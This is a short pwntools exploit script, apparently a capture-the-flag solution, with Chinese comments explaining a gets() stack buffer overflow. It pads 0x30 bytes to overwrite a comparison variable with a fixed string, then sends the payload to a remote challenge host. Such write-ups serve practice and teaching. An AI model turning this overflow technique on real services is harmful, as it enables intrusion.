from pwn import *

#   _QWORD v4[6]; // [rsp+0h] [rbp-70h] BYREF
#   _DWORD ju3t___f_k3_f1_g[6]; // [rsp+30h] [rbp-40h] BYREF
#   gets(v4, argv);
# 溢出点 v4 距离rbp-0x70, 传入check函数的对比变量 ju3t___f_k3_f1_g 距离 rbp-0x40
# 从gets溢出点输入 0x30之后就是 ju3t___f_k3_f1_g 变量的位置了，直接填入：n0t_r3@11y_f1@g

r = remote('node5.buuoj.cn', 25216)

payload = b'A' * 0x30 + b'n0t_r3@11y_f1@g'
r.sendline(payload)
r.interactive()
